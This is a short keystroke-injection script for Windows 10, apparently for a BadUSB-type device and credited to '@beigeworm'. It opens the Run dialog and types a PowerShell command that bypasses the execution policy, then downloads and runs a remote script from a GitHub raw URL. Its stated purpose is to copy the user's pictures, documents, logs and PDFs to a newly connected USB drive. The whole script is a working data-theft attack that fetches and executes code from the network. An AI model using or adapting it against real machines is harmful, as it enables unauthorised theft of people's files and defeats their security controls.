// Title: beigeworm's Exfiltrate files USB Drive
// Author: @beigeworm
// Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to newly connected USB drive.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -C $driveName = ''; $Hidden = ''; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Exfiltrate-to-USB/main.ps1 | iex");
delay(500);
press("ENTER");
